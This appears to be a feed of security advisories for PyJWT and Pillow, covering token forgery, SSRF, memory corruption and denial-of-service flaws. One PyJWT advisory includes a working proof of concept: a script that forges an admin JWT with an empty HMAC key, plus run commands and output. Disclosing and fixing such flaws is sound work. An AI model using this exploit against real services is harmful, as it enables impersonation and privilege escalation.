Vulnerabilities.Title: pyjwt: PyJWT: Authentication bypass via improper public key validation
Vulnerabilities.Description: PyJWT is a Python implementation of JSON Web Token standards. Prior to 2.14.0, is_pem_format in jwt/utils.py is affected because is_pem_format does not recognize every PEM representation accepted by the cryptography loader. This occurs when an application mixes HMAC and asymmetric algorithms and supplies a mutated public-key PEM as raw key bytes. As a result, HMACAlgorithm.prepare_key treats the unrecognized asymmetric public key as an HMAC secret. Consequently, an attacker who knows the public key can forge authenticated HMAC tokens. This issue is fixed in version 2.14.0.

Vulnerabilities.Title: pyjwt: pyjwt: Verification key substitution via unvalidated JWKS redirects
Vulnerabilities.Description: PyJWT is a Python implementation of JSON Web Token standards. Prior to 2.14.0, PyJWT PyJWKClient is affected because redirect destinations are not revalidated against the JWKS trust boundary. This occurs when a configured trusted JWKS endpoint returns an attacker-influenced redirect. As a result, PyJWKClient follows the redirect and consumes the redirected response as key material. Consequently, forwarded credentials may be disclosed or verification keys may be substituted. This issue is fixed in version 2.14.0.

Vulnerabilities.Title: pyjwt: PyJWT: Authentication bypass via acceptance of DER public keys as HMAC secrets
Vulnerabilities.Description: PyJWT is a Python implementation of JSON Web Token standards. From 2.4.0 until 2.14.0, PyJWT HMACAlgorithm.prepare_key is affected because asymmetric-key guard relies on textual markers that are absent from DER encoding. This occurs when an application mixes HMAC and asymmetric algorithms and supplies a DER public key as the shared verification key. As a result, PyJWT uses public DER bytes as an HMAC secret. Consequently, an attacker who knows the public key can forge authenticated HMAC tokens. This issue is fixed in version 2.14.0.

Vulnerabilities.Title: pyjwt: PyJWT accepts unknown `crit` header extensions (RFC 7515 §4.1.11 MUST violation)
Vulnerabilities.Description: PyJWT is a JSON Web Token implementation in Python. Prior to 2.12.0, PyJWT does not validate the crit (Critical) Header Parameter defined in RFC 7515 §4.1.11. When a JWS token contains a crit array listing extensions that PyJWT does not understand, the library accepts the token instead of rejecting it. This violates the MUST requirement in the RFC. This vulnerability is fixed in 2.12.0.

Vulnerabilities.Title: python-pyjwt: PyJWT: Authentication bypass due to forged JSON Web Tokens
Vulnerabilities.Description: PyJWT is a JSON Web Token implementation in Python. Prior to 2.13.0, when the verifier is decoding JSON Web Tokens, while supporting both asymmetric and HMAC algorithms, the library does not validate use of JSON Web Keys in HMAC algorithm, allowing attacker to use the issuer public key as the secret key for HMAC algorithm. This vulnerability is fixed in 2.13.0.

Vulnerabilities.Title: PyJWT: HS256/384/512 verify accepts empty HMAC key via oct JWK (PyJWK/PyJWKClient) enabling token forgery
Vulnerabilities.Description:
### Summary

`HMACAlgorithm.from_jwk` accepts a symmetric (`kty=oct`) JWK whose `k` value is
the empty string and returns a zero-length key without raising. When a token is
then verified with that key object (a `PyJWK`, or a `PyJWK` resolved by
`PyJWKSet` / `PyJWKClient`), the HMAC verifier computes
`HMAC(key=b"", signing_input)` and accepts any token an attacker forged with the
same empty key. The attacker needs no secret knowledge: they reproduce the digest
locally with an empty key and set the token's `kid` to the empty-`k` JWK.

The empty-key rejection that `HMACAlgorithm.prepare_key` performs for
string/bytes secrets (added in 2.13.0) was never propagated to the sibling
`from_jwk` code path, so the JWK/JWKS verification route stays exploitable. Under
default decode options this path only emits an `InsecureKeyLengthWarning`, not an
error, so verification still succeeds. This is the same "empty/nil HMAC key is
accepted by verify" defect the JWT ecosystem is currently closing library-side:
fast-jwt CVE-2026-44351 (CVSS 9.1) and ruby-jwt CVE-2026-45363 both added a
library-side reject-empty-HMAC-key precondition.

### Affected versions

`PyJWT` (PyPI package `pyjwt`) `<= 2.13.0`, current `master` at commit
`7144e4534c34810f4525dc4578a32addd8212cff`. The string/bytes secret path is
already guarded in 2.13.0; the JWK/JWKS path is not.

### Privilege required

Unauthenticated. Any party who can reach a JWT-verifying endpoint of an
application that verifies via a `PyJWK` / `PyJWKSet` / `PyJWKClient` whose oct
key has an empty `k` can forge tokens with arbitrary claims.

Preconditions: the verifier resolves the HMAC key from a JWK/JWKS whose oct
entry carries an empty `k`. This occurs when the signing secret is sourced from
an unset environment variable / unset config row / key-finder fallback that
base64url-encodes `b""` into the published JWKS, or when the application trusts a
JWKS containing such an entry. The equivalent unset-secret case for the
string-secret API (`jwt.decode(token, key="")`) is already rejected in 2.13.0;
the JWK route is the remaining reachable surface for the same misconfiguration.

### Vulnerable code

`jwt/algorithms.py`, `HMACAlgorithm.from_jwk` (line 380):

```python
@staticmethod
def from_jwk(jwk: str | JWKDict) -> bytes:
    try:
        if isinstance(jwk, str):
            obj: JWKDict = json.loads(jwk)
        elif isinstance(jwk, dict):
            obj = jwk
        else:
            raise ValueError
    except ValueError:
        raise InvalidKeyError("Key is not valid JSON") from None

    if obj.get("kty") != "oct":
        raise InvalidKeyError("Not an HMAC key")

    return base64url_decode(obj["k"])   # <-- empty k -> b"", no rejection
```

Contrast the sibling `prepare_key`, which DID get the guard (lines 325-329):

```python
def prepare_key(self, key: str | bytes) -> bytes:
    key_bytes = force_bytes(key)

    if len(key_bytes) == 0:
        raise InvalidKeyError("HMAC key must not be empty.")
```

In `jwt/api_jws.py`, `_verify_signature` (lines 389-416) uses the `PyJWK` key
material directly, bypassing `prepare_key`, and the length warning is non-fatal
by default:

```python
        if isinstance(key, PyJWK):
            if alg != key.algorithm_name:
                raise InvalidAlgorithmError(
                    f"Token algorithm {alg!r} does not match the key's "
                    f"algorithm {key.algorithm_name!r}"
                )
            alg_obj = key.Algorithm
            prepared_key = key.key            # from_jwk output (b""), prepare_key not run
        else:
            try:
                alg_obj = self.get_algorithm_by_name(alg)
            except NotImplementedError as e:
                raise InvalidAlgorithmError("Algorithm not supported") from e
            prepared_key = alg_obj.prepare_key(key)

        key_length_msg = alg_obj.check_key_length(prepared_key)
        if key_length_msg:
            if effective_options.get("enforce_minimum_key_length", False):
                raise InvalidKeyError(key_length_msg)
            else:
                warnings.warn(key_length_msg, InsecureKeyLengthWarning, stacklevel=4)  # default: warn only

        if not alg_obj.verify(signing_input, prepared_key, signature):  # verify with b"" succeeds
            raise InvalidSignatureError("Signature verification failed")
```

`PyJWK.__init__` sets `self.key = self.Algorithm.from_jwk(self._jwk_data)`, so a
`{"kty":"oct","k":""}` JWK yields `PyJWK.key == b""`. `PyJWKSet` and
`PyJWKClient.get_signing_key_from_jwt` build `PyJWK` objects the same way, so the
JWKS-over-HTTP resolution route is affected identically.

The 2.13.0 release note (`CHANGELOG.rst`) documents the `prepare_key` JWK/PEM
hardening (GHSA-xgmm-8j9v-c9wx) and the `PyJWK` alg-binding fix
(GHSA-jq35-7prp-9v3f), and the test suite has
`test_hmac_prepare_key_rejects_empty_key` plus
`test_hmac_from_jwk_should_raise_exception_if_empty_json` (which tests an empty
JSON object `{}`, not an oct key with empty `k`). The empty-`k` oct case is the
untested sibling path this report closes.

### How the attacker input reaches the sink

An unauthenticated HTTP client controls the bearer token entirely: its `kid`
selects the empty-`k` oct JWK, and its signature is computed locally with the
empty key. The token flows request header -> `PyJWKClient.get_signing_key_from_jwt`
(kid resolution against the trusted JWKS) -> `jwt.decode` with the resolved
`PyJWK` -> `_verify_signature` -> `HMACAlgorithm.verify(signing_input, b"", sig)`.
No secret,
credential, or prior session is required; the only server-side precondition is a
JWKS oct entry with an empty `k`, which the "unset signing secret" configuration
produces. This is the identical trust boundary the string-secret path already
guards.

### Proof of concept

### End-to-end reproduction against pinned PyPI `pyjwt` 2.13.0 (two deployed Flask services)

Two services model a standard OIDC-style deployment: an auth service publishing a
JWKS, and a protected resource server validating bearer tokens against that JWKS
with PyJWT's documented `PyJWKClient` pattern. The auth service's signing secret
is sourced from an unset env var (`SIGNING_SECRET` unset -> `""`), so the
published oct JWK carries `k == ""`.

`idp.py` (auth service):

```python
import os, base64
from flask import Flask, jsonify
app = Flask(__name__)
SIGNING_SECRET = os.environ.get("SIGNING_SECRET", "")   # UNSET at runtime -> ""
def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

@app.route("/.well-known/jwks.json")
def jwks():
    return jsonify({"keys": [{
        "kty": "oct", "use": "sig", "alg": "HS256",
        "kid": "auth-signing-2026",
        "k": b64u(SIGNING_SECRET.encode()),   # empty secret -> k == ""
    }]})

if __name__ == "__main__":
    app.run(port=9101)
```

`api.py` (protected resource server):

```python
from flask import Flask, request, jsonify
import jwt
from jwt import PyJWKClient
app = Flask(__name__)
jwks_client = PyJWKClient("http://127.0.0.1:9101/.well-known/jwks.json")

def authenticate():
    auth = request.headers.get("Authorization", "")
    if not auth.startswith("Bearer "):
        return None, "missing bearer token"
    token = auth.split(" ", 1)[1]
    try:
        signing_key = jwks_client.get_signing_key_from_jwt(token)  # resolves by kid
        claims = jwt.decode(token, signing_key, algorithms=["HS256", "RS256"])
    except Exception as e:
        return None, "invalid token: %s" % type(e).__name__
    return claims, None

@app.route("/api/admin/users")
def admin_users():
    claims, err = authenticate()
    if err:
        return jsonify({"error": err}), 401
    if claims.get("role") != "admin":
        return jsonify({"error": "forbidden"}), 403
    return jsonify({"ok": True, "action": "list_all_users",
                    "as_user": claims.get("sub"), "role": claims.get("role")})

if __name__ == "__main__":
    app.run(port=9102)
```

`forge.py` (attacker; no secret knowledge):

```python
import hmac, hashlib, base64, json, sys
def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
header={"alg":"HS256","typ":"JWT","kid":"auth-signing-2026"}
payload={"sub":"attacker@evil.example","role":"admin"}
si=b64u(json.dumps(header,separators=(',',':')).encode())+"."+b64u(json.dumps(payload,separators=(',',':')).encode())
key = sys.argv[1].encode() if len(sys.argv)>1 else b""   # empty key
sig=hmac.new(key, si.encode(), hashlib.sha256).digest()
print(si+"."+b64u(sig))
```

Run:

```bash
python -m venv v && ./v/bin/pip install "PyJWT==2.13.0" flask
( SIGNING_SECRET= ./v/bin/python idp.py & ) ; ./v/bin/python api.py &
FORGED=$(./v/bin/python forge.py "")
curl -s -H "Authorization: Bearer $FORGED" http://127.0.0.1:9102/api/admin/users
```

Verbatim run (attack, both negative controls, sanity, and patched-build re-run):

```
### PyJWT version
2.13.0

### JWKS published by the auth service (note the empty "k"):
{"keys":[{"alg":"HS256","k":"","kid":"auth-signing-2026","kty":"oct","use":"sig"}]}

### Baseline: unauthenticated request to admin endpoint
HTTP 401

### ATTACK: attacker forges HS256 admin token signed with the EMPTY key
forged token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImF1dGgtc2lnbmluZy0yMDI2In0.eyJzdWIiOiJhdHRhY2tlckBldmlsLmV4YW1wbGUiLCJyb2xlIjoiYWRtaW4ifQ.iwgDP9D-oD0zXWMEUhx710f_NjHWKkrLVgjPAOtEUSQ
response:
{"action":"list_all_users","as_user":"attacker@evil.example","ok":true,"role":"admin"}
  <-- HTTP 200

### NEGATIVE CONTROL 1: forge with a WRONG non-empty key (IdP still empty) -> reject
{"error":"invalid token: InvalidSignatureError"}
  <-- HTTP 401

### NEGATIVE CONTROL 2: IdP restarted with a REAL non-empty secret; empty-key forgery must now fail
JWKS now has non-empty k:
{"keys":[{"alg":"HS256","k":"YS1yZWFsLTMyLWJ5dGUtc3Ryb25nLXNlY3JldC12YWx1ZS0xMjM0","kid":"auth-signing-2026","kty":"oct","use":"sig"}]}
{"error":"invalid token: InvalidSignatureError"}
  <-- HTTP 401

### Sanity: a legitimately-signed token with the real secret is accepted
{"action":"list_all_users","as_user":"attacker@evil.example","ok":true,"role":"admin"}
  <-- HTTP 200

### PATCHED BUILD (from_jwk rejects empty k): re-run the empty-key forgery -> now rejected
JWKS (empty k, vulnerable config):
{"keys":[{"alg":"HS256","k":"","kid":"auth-signing-2026","kty":"oct","use":"sig"}]}
{"error":"invalid token: PyJWKSetError"}
  <-- HTTP 401
```

The attack returns HTTP 200 with `role:admin` from an unauthenticated forged
token. Both negative controls (wrong non-empty key; real non-empty secret at the
auth service) return 401, isolating the defect to empty-key acceptance. The
patched build (the `from_jwk` fix below) rejects the forgery.

### Impact

- Unauthenticated authentication bypass / token forgery: an attacker mints tokens
  with arbitrary claims (`role:admin`, arbitrary `sub`) that verify successfully,
  yielding full impersonation and privilege escalation on any endpoint gated by
  such tokens.
- Reachable through the documented JWKS verification API
  (`PyJWKClient` / `PyJWKSet` / `PyJWK`), not just direct `HMACAlgorithm` use.
- Triggered by the common "unset signing secret" misconfiguration that the
  string-secret path already rejects in 2.13.0, leaving the JWK path as an
  asymmetric gap.

### Suggested fix

Reject a zero-length key in `HMACAlgorithm.from_jwk`, mirroring the guard that
`prepare_key` already applies:

```python
if obj.get("kty") != "oct":
    raise InvalidKeyError("Not an HMAC key")

key_bytes = base64url_decode(obj["k"])
if len(key_bytes) == 0:
    raise InvalidKeyError("HMAC key must not be empty.")
return key_bytes
```

This reuses the exact error message and length check the string/bytes path uses,
so both HMAC key-loading routes enforce the same invariant. A regression test for
the empty-`k` oct JWK belongs next to `test_hmac_from_jwk_should_raise_exception_if_empty_json`.

### Fix PR

https://github.com/jpadilla/pyjwt-ghsa-pxh4-856f-4h89/pull/1 (private advisory
temp fork, base `master`, branch `fix/hmac-from-jwk-reject-empty-key`,
DCO-signed; adds `test_hmac_from_jwk_rejects_empty_k`; `test_algorithms.py`,
`test_api_jwk.py`, `test_api_jws.py` pass).

### Credit

Reported by tonghuaroot.

> Maintainer update (2026-09-10): We reproduced the reported behavior: an `oct` JWK with an empty `k` value was decoded to an empty HMAC key and accepted through the JWK/PyJWK verification path, while the raw string/bytes path correctly rejected an empty key. The fix adds the same empty-key validation at the JWK boundary and includes a regression test. It is committed as `af8181ca0bec5e6b372fbba9afbe23702b787ceb` and has passed the available project tox environments, including crypto and non-crypto tests on Python 3.9, 3.12, and 3.13, plus mypy, package metadata, and coverage checks. Fresh Astra/max review accepted the fix and confirmed that nonempty, binary, and asymmetric-key behavior remains unchanged. The fix has not yet shipped in a released PyJWT version, so this advisory is being moved to draft and remains unpublished pending release.

## Maintainer update — 2026-09-11

The verified fix for this advisory is included in PyJWT 2.14.0, released on 2026-09-11 and available on PyPI. PyJWT 2.14.0 is the first release containing the fix. This advisory is now published with 2.14.0 recorded as the patched version.

Vulnerabilities.Title: pyjwt: PyJWT: Denial of Service via outbound request amplification on unknown key identifiers
Vulnerabilities.Description: PyJWT is a Python implementation of JSON Web Token standards. Prior to 2.14.0, PyJWT get_signing_key_from_jwt is affected because unknown kid misses force refreshes without a negative cache or minimum refresh interval. This occurs when unauthenticated tokens repeatedly use the same unknown kid or varying kid values absent from the cached JWKS. As a result, each cache miss causes PyJWKClient to refresh the JWKS. Consequently, attacker traffic can amplify outbound requests to the configured JWKS endpoint. This issue is fixed in version 2.14.0.

Vulnerabilities.Title: pyjwt: PyJWT: Denial of Service via deeply nested JSON token payload
Vulnerabilities.Description: PyJWT is a Python implementation of JSON Web Token standards. From 2.0.0a1 until 2.15.0, PyJWT PyJWKClient.get_signing_key_from_jwt is affected because payload parser catches ValueError but not RecursionError. This occurs when an attacker-controlled recursively nested payload reaches json.loads. As a result, documented PyJWT exception handling does not contain the failure. Consequently, an unauthenticated request can raise an exception that may produce an HTTP 500 response. The advisory-defined affected implementation also includes jwt/api_jwt.py, verify_signature=False. This issue is fixed in version 2.15.0.

Vulnerabilities.Title: pyjwt: PyJWT: Token revocation bypass via non-canonical signature decoding
Vulnerabilities.Description: PyJWT is a Python implementation of JSON Web Token standards. Prior to 2.14.0, PyJWT signature segment is affected because signature segment decoding accepts characters outside the canonical Base64URL representation. This occurs when non-Base64URL characters are appended to a valid compact JWS signature segment. As a result, base64url_decode produces the same signature bytes for different serialized segments. Consequently, raw-token revocation checks can fail to recognize an equivalent modified token. This issue is fixed in version 2.14.0.

Vulnerabilities.Title: pyjwt: pyjwt: Denial of Service via regular expression backtracking in is_pem_format
Vulnerabilities.Description: PyJWT is a Python implementation of JSON Web Token standards. Prior to 2.14.0, PyJWT is_pem_format is affected because lazy PEM regular expression backtracks extensively. This occurs when a certificate-like input contains repeated BEGIN markers without a matching END marker. As a result, is_pem_format performs unbounded backtracking while searching for a PEM end marker. Consequently, an attacker can cause intensive CPU consumption. This issue is fixed in version 2.14.0.

Vulnerabilities.Title: pyjwt: pyjwt: Denial of Service via malformed RSA key in JWK set
Vulnerabilities.Description: PyJWT is a Python implementation of JSON Web Token standards. From 2.9.0 until 2.14.0, PyJWKSet does not catch the plain ValueError raised for malformed RSA JWK components by RSAAlgorithm.from_jwk in  jwt/api_jwk.py. This occurs when a JWK Set contains a malformed RSA key alongside otherwise usable keys. As a result, one malformed member aborts construction of the entire PyJWKSet. Consequently, applications can experience authentication failures or request-level denial of service. This issue is fixed in version 2.14.0.

Vulnerabilities.Title: pyjwt: PyJWT: Token verification bypass via mismatched OKP key components
Vulnerabilities.Description: PyJWT is a Python implementation of JSON Web Token standards. From 2.1.0 until 2.15.0, PyJWT OKPAlgorithm.from_jwk in  jwt/algorithms.py is affected because private-JWK import path does not compare the public key derived from d with x. This occurs when an OKP private JWK supplies non-corresponding x and d components. As a result, identity derived from x can differ from operations performed with d. Consequently, if an integration also accepts private key parameters from a proof header without rejecting them, an attacker may use a stolen sender-constrained token without the legitimate private key. This issue is fixed in version 2.15.0.

Vulnerabilities.Title: python-pyjwt: PyJWT: Server-Side Request Forgery (SSRF) via uncontrolled URL fetching in PyJWKClient
Vulnerabilities.Description: PyJWT is a JSON Web Token implementation in Python. Prior to 2.13.0, PyJWKClient passes its uri argument directly to urllib.request.urlopen() which uses Python stdlib's default OpenerDirector registering HTTPHandler, HTTPSHandler, FTPHandler, FileHandler, and DataHandler. There is currently no documented option to restrict which schemes PyJWKClient will fetch. If an application's jku URL ingestion path accepts attacker-influenced URLs (e.g., from JWT header, configuration file, OAuth flow parameter), the attacker can cause PyJWKClient to read arbitrary local files via file:// (SSRF on local filesystem), cause PyJWKClient to attempt FTP / data-URI fetches (broader SSRF surface), or forge tokens that PyJWT verifies as valid. The library does not directly return non-HTTP(S) URI contents to the attacker; the chained "plant a JWKS to forge tokens" scenario described in the original report requires additional application-layer flaws (attacker write access to a filesystem path, untrusted jku derivation) that this fix does not address. This vulnerability is fixed in 2.13.0.

Vulnerabilities.Title: python-pyjwt: PyJWT: Verifier-side algorithm bypass leads to unauthorized information access
Vulnerabilities.Description: PyJWT is a JSON Web Token implementation in Python. From 2.9.0 to 2.12.1, there is a verifier-side algorithm allow-list bypass when jwt.decode() or jwt.decode_complete() are called with a PyJWK key. The token header alg is checked against the caller-supplied algorithms allow-list, but signature verification is performed with the algorithm bound to the PyJWK object instead of the header algorithm. An attacker who controls a registered JWK/JWKS private key can sign with a disallowed algorithm, advertise an allowed algorithm in the JWT header, and still be accepted. The issue affects the documented PyJWKClient.get_signing_key_from_jwt(...) flow. This vulnerability is fixed in 2.13.0.

Vulnerabilities.Title: python-pyjwt: PyJWT: Denial of Service via processing of crafted detached JWS tokens
Vulnerabilities.Description: PyJWT is a JSON Web Token implementation in Python. From 2.8.0 to 2.12.1, when verifying detached JWS tokens using the unencoded-payload option ("b64": false, RFC 7797), PyJWT performs Base64URL decoding of the compact-serialization payload segment before enforcing the detached-payload rules. For b64=false, PyJWT later discards that decoded payload and replaces it with the caller-provided detached_payload. In practice, this turns the middle segment into an attacker-controlled “work amplifier”: a remote client can supply an arbitrarily large Base64URL payload segment that forces CPU work + memory allocations even if the signature is invalid. This creates an unauthenticated DoS vector against any endpoint that verifies detached JWS using PyJWT. This vulnerability is fixed in 2.13.0.

Vulnerabilities.Title: python-pyjwt: PyJWT: Denial of Service via unverified JSON Web Token key IDs
Vulnerabilities.Description: PyJWT is a JSON Web Token implementation in Python. Prior to 2.13.0, PyJWKClient.get_signing_key() forces a fresh HTTP request to the JWKS endpoint for every JWT with an unknown kid value, with no rate limiting. Since kid comes from the unverified token header, an attacker can trigger unlimited outbound requests. The vulnerability surfaces only when a JWKS fetch fails; an attacker can attempt to provoke that with sustained unknown-kid traffic, but the outcome depends on upstream JWKS-endpoint behavior (rate limiting, transient errors) which is beyond the attacker's control. This vulnerability is fixed in 2.13.0.

Vulnerabilities.Title: pillow: Pillow: Heap buffer overflow in _tiffWriteProc when saving TIFF to BytesIO
Vulnerabilities.Description: Pillow is a Python imaging library. From 2.0.0 until 13.0.0, Pillow has a heap buffer overflow and stale-heap disclosure in _tiffWriteProc when saving compressed TIFF data through libtiff to a target without a usable fileno(), such as BytesIO. The callback sizes its allocation from the prior buffer size instead of the current write position, allowing an attacker-controlled out-of-line TIFF tag or retained ICC profile to be copied beyond the allocation after libtiff seeks forward. This overflow can crash the process and may allow code execution. Independently, unwritten alignment gaps in compressed TIFF output larger than 64 KiB can disclose stale heap bytes without a crafted tag. File paths and targets with real file descriptors are unaffected. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: Pillow: Heap buffer overflow in FlashPix (FPX) JPEG decoding leads to code execution
Vulnerabilities.Description: Pillow is a Python imaging library. Prior to 13.0.0, Pillow's FlashPix JPEG-tile decoder can write decoded scanlines beyond the allocated tile buffer. FlashPix (FPX) JPEG decoding selects raw mode LA with two bytes per pixel, while an unrecognized JPEG mode can be decoded as JCS_UNKNOWN with four components, causing ImagingJpegDecode to write four-component scanlines into the two-byte tile buffer. An attacker can supply a crafted OLE2 FlashPix file to an application with the optional olefile dependency installed that opens or thumbnails untrusted input. This can corrupt heap memory and may allow arbitrary code execution. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: Pillow: Heap buffer overflow in ImagingJpegDecode
Vulnerabilities.Description: Pillow is a Python imaging library. Prior to 13.0.0, Pillow's JPEG decoder can write a full-width scanline into a buffer sized for a requested draft scale. ImagingJpegDecode does not verify libjpeg's actual output width and component count after scaling is requested, and an 8-bit lossless SOF3 JPEG decoded by a build linked to libjpeg-turbo 3.x can ignore the requested downscaling geometry. An attacker can supply such a JPEG to an application that uses draft() or thumbnail() to request downscaling. This can corrupt heap memory, crash the process, or potentially allow code execution. Older libjpeg-turbo 2.x and IJG builds reject the SOF3 input. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: Pillow: Argument Injection in Ghostscript call, potentially leading into RCE
Vulnerabilities.Description: Pillow is a Python imaging library. From 2.6.0 until 13.0.0, Pillow is vulnerable to argument injection when invoking Ghostscript for EPS input. EpsImagePlugin.Ghostscript passes a caller-controlled input filename after -f without converting it to a safe absolute path, so a name beginning with a hyphen can be interpreted as a Ghostscript option. An attacker who controls the filename can inject Ghostscript arguments. Arbitrary command execution specifically requires a leading @ argument-file filename and control of the referenced text file containing additional Ghostscript arguments; the reported chain reproduces with the default -dSAFER invocation. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: Pillow is a Python imaging library. From 11.0.0 until 13.0.0, multi-fr ...
Vulnerabilities.Description: Pillow is a Python imaging library. From 11.0.0 until 13.0.0, multi-frame loaders can retain an ImagingCore allocation created for a narrow frame mode while a later frame of the same dimensions changes the logical mode and decoder tiles to wider RGB or CMYK data. ImageFile.load_prepare() reuses the stale native storage because _im is non-null without verifying that its mode and size still match. Crafted PSD, MPO, DCX, or MIC frame transitions can then write wider pixels into the narrow allocation, causing native out-of-bounds writes and crashes. The MPO path can also cause a native over-read and, in demonstrated runtime-specific profiles, command execution. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: Pillow: Denial of Service via infinite loop during crafted MIC image parsing
Vulnerabilities.Description: Pillow is a Python imaging library. From 7.2.0 until 13.0.0, Pillow can enter an infinite loop while determining the frame count of a MIC image. MicImageFile inherits TIFF frame traversal, but MicImageFile.tell reports the OLE stream index and its seek() resets TIFF frame state, so an embedded TIFF with at least three IFDs never advances. When an application with olefile installed reads n_frames or saves all frames from a crafted MIC file, the non-advancing traversal can hold a worker at full CPU indefinitely. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: pillow: Denial of Service via zero-size images in rank filters
Vulnerabilities.Description: Pillow is a Python imaging library. Prior to 13.0.0, Pillow's rank-based filters can dereference invalid image storage for a zero-size image. ImagingExpand() allocates a non-empty output and then faults while replicating edges by reading the first pixel from empty input storage; ImagingRankFilter is never reached. An attacker can supply or cause creation of a zero-size image to an application that applies a rank, median, minimum, or maximum filter. This causes a native process crash. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: pillow: Denial of Service via out-of-bounds memory access on zero-width images
Vulnerabilities.Description: Pillow is a Python imaging library. Prior to 13.0.0, Pillow's ImageMorph.MorphOp.apply() can access memory before a row buffer for a zero-width image. PPM and PGM input can create an image with width zero, and the native morphology routine indexes outrow[width - 1] without rejecting that geometry. An attacker can supply such an image to an application that applies a morphology operation. This can crash the process. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: pillow: Denial of service via crafted APNG image
Vulnerabilities.Description: Pillow is a Python imaging library. From 8.1.0 until 13.0.0, Pillow can allocate an APNG disposal background at the full canvas size before applying the decompression-bomb check. A crafted APNG with a small first frame, a very large declared canvas, and background disposal or first-frame OP_PREVIOUS reaches PngImageFile._seek while Image.open() positions frame zero. The full-canvas allocation occurs inside Image.open() without requiring pixel loading or frame iteration. This can exhaust memory and deny service. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: pillow: Denial of Service via memory exhaustion from crafted GIF image
Vulnerabilities.Description: Pillow is a Python imaging library. From 9.2.0 until 13.0.0, Pillow can retain a rejected GIF frame size after a decompression-bomb exception. In GifImageFile._seek, a crafted GIF can leave rejected dimensions stored after Image.DecompressionBombError; if an application catches that exception and continues processing the same image object, later seek or load operations allocate according to those dimensions and can exhaust memory, denying service. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: pillow: Denial of service via double free during image transformation
Vulnerabilities.Description: Pillow is a Python imaging library. Prior to 13.0.0, Pillow can double free image memory when ImagingScaleAffine encounters a selective allocation failure. The affected fast path handles Transform.EXTENT or pure scale-and-translate Transform.AFFINE operations with the default NEAREST resampling. The output image allocation must succeed while the additional per-column lookup allocation fails, after which the error path deletes image storage that later cleanup releases again. An attacker who can drive such a large Image.transform() operation under memory pressure may trigger the failure. This can crash the process and may corrupt memory. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: Pillow: Denial of Service via out-of-bounds read in TIFF decoding
Vulnerabilities.Description: Pillow is a Python imaging library. From 8.1.0 until 13.0.0, Pillow's TIFF tile and RGBA decode paths can read beyond row data produced by libtiff. In _decodeTile and the RGBA unpacker path, when Pillow and libtiff interpret duplicated PhotometricInterpretation or BitsPerSample tags differently, Pillow does not verify that the required input row fits inside the row libtiff produced, while the strip path has this validation. Loading pixels from such a crafted TIFF can expose adjacent heap data in output pixels or crash the process. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: pillow: Denial of Service via infinite loop during PDF page rewriting
Vulnerabilities.Description: Pillow is a Python imaging library. From 5.1.0 until 13.0.0, Pillow can enter an infinite loop while rewriting PDF pages. PdfParser.rewrite_pages() follows Parent relationships without detecting a cycle in the page tree. An attacker can supply a cyclic PDF to an application that appends an image to that PDF. This can hold the worker at full CPU and deny service. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: pillow: Denial of Service via unbounded memory expansion in MSP image decoder
Vulnerabilities.Description: Pillow is a Python imaging library. From 4.1.0 until 13.0.0, Pillow's MSP RLE decoder can expand a small file into an unbounded in-memory buffer. The decoder writes run-length output to BytesIO without limiting expansion to the declared image size. An attacker can supply a crafted MSP image to an application that loads its pixels. This can exhaust memory and deny service even when the declared pixel count passes the decompression-bomb check. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: Pillow: Denial of Service via invalid pointer free during font rendering
Vulnerabilities.Description: Pillow is a Python imaging library. From 10.0.0 until 13.0.0, Pillow can free an invalid glyph pointer during FreeType rendering with an active stroker. If FT_Load_Glyph fails, cleanup may call FT_Done_Glyph on an uninitialized or stale glyph variable. An attacker can supply a malformed font as untrusted bytes to an application that draws text with a nonzero stroke width, forcing the glyph-load failure path. This can corrupt memory or crash the process. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: pillow: Denial of Service via crafted multi-frame image conversion
Vulnerabilities.Description: Pillow is a Python imaging library. From 5.1.0 until 13.0.0, Pillow takes quadratic time to reserve PDF object identifiers when saving many frames with save_all enabled. PdfParser.next_object_id() repeatedly rebuilds and scans all previously reserved identifiers for every object. An attacker can supply a multi-frame image, including a small APNG with a large declared frame count, to an application that converts it to a multipage PDF. This can consume excessive CPU and deny service. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: pillow: Denial of service via crafted PDF during append operations
Vulnerabilities.Description: Pillow is a Python imaging library. From 5.1.0 until 13.0.0, Pillow can exhaust resources while parsing an existing PDF during an append operation. PdfParser follows page-tree child references without cycle or duplication tracking and follows previous-trailer chains with only an exact repeated-offset guard, so deep or cyclic page trees and long chains of unique trailer offsets can exhaust the Python stack. Repeated non-cyclic /Kids references can also cause super-linear CPU and memory use. An attacker can supply such a PDF to an application that calls Image.save with PDF append enabled. This can raise an uncaught RecursionError or consume excessive CPU and memory before output is written, causing denial of service. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: Pillow: Denial of Service via out-of-bounds read in TIFF encoder
Vulnerabilities.Description: Pillow is a Python imaging library. Prior to 13.0.0, Pillow's TIFF encoder can read beyond a ColorMap buffer when retained TIFF metadata has a plane size inconsistent with BitsPerSample. A small TIFF can be opened normally and then retain a crafted ColorMap that is reused when the image is saved. An application that re-encodes the attacker's TIFF with libtiff can trigger the out-of-bounds read. This can disclose heap memory in the output or crash the process. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: pillow: Information disclosure via uninitialized buffer in TIFF decoding
